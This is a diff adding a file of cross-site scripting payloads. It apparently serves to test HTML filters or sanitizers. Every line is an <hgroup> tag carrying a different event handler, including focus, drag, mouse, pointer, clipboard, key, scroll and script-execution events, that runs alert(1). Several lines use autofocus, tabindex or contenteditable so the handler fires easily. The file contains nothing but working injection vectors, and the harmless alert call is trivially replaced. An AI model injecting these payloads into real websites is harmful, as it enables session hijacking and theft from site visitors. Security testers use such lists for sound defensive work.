@@ -1,0 +1,38 @@
+<hgroup contenteditable onbeforeinput=alert(1)>test
+<hgroup draggable="true" ondrag="alert(1)" style=display:block>test</hgroup>
+<hgroup draggable="true" ondragend="alert(1)" style=display:block>test</hgroup>
+<hgroup draggable="true" ondragenter="alert(1)" style=display:block>test</hgroup>
+<hgroup draggable="true" ondragleave="alert(1)" style=display:block>test</hgroup>
+<hgroup draggable="true" ondragstart="alert(1)" style=display:block>test</hgroup>
+<hgroup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></hgroup>
+<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
+<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
+<hgroup onafterscriptexecute=alert(1)><script>1</script>
+<hgroup onbeforescriptexecute=alert(1)><script>1</script>
+<hgroup onblur=alert(1) id=x tabindex=1 style=display:block>test</hgroup><input value=clickme>
+<hgroup onclick="alert(1)" style=display:block>test</hgroup>
+<hgroup oncontextmenu="alert(1)" style=display:block>test</hgroup>
+<hgroup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<hgroup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<hgroup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</hgroup>
+<hgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</hgroup><input value=clickme>
+<hgroup onkeydown="alert(1)" contenteditable style=display:block>test</hgroup>
+<hgroup onkeypress="alert(1)" contenteditable style=display:block>test</hgroup>
+<hgroup onkeyup="alert(1)" contenteditable style=display:block>test</hgroup>
+<hgroup onmousedown="alert(1)" style=display:block>test</hgroup>
+<hgroup onmouseenter="alert(1)" style=display:block>test</hgroup>
+<hgroup onmouseleave="alert(1)" style=display:block>test</hgroup>
+<hgroup onmousemove="alert(1)" style=display:block>test</hgroup>
+<hgroup onmouseout="alert(1)" style=display:block>test</hgroup>
+<hgroup onmouseover="alert(1)" style=display:block>test</hgroup>
+<hgroup onmouseup="alert(1)" style=display:block>test</hgroup>
+<hgroup onmousewheel=alert(1) style=display:block>requires scrolling
+<hgroup onpointerdown=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerenter=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerleave=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointermove=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerout=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerover=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerrawupdate=alert(1) style=display:block>XSS</hgroup>
+<hgroup onpointerup=alert(1) style=display:block>XSS</hgroup>
+<hgroup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></hgroup>
